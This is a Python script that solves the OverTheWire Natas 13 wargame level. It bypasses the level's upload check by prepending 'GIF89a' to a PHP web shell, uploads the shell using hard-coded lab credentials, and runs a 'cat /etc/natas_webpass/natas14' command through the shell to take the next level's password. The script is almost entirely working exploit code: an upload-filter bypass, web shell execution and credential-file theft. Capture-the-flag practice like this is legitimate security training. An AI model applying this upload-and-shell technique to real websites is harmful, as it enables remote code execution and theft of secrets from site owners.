#!/usr/bin/env python 

'''
File is bieng checked on the basis of its exif data
It can be bypassed by adding 'GIF89a' at the very beginning of our shell.php 
'''


import requests 
import re 

r        = requests.session()
url      = "http://natas13.natas.labs.overthewire.org/"
username = "natas13"
password = "jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY"
data     = {'filename' : 'shell.php' , 'MAX_FILE_SIZE' : "1000"}
filedata = open('shell.php' , 'rb')
files    = {'uploadedfile' : filedata }
resp = r.post(url,auth = (username,password) , data = data , files = files )
upload_dir = re.findall(r'>upload.*php',resp.text)
upload_dir = upload_dir[0][1:]
shell_command = "?cmd=cat /etc/natas_webpass/natas14"
shell_url = url + upload_dir + shell_command
resp = r.get(shell_url, auth=(username,password))
print("The Key is : " + resp.text[7:])
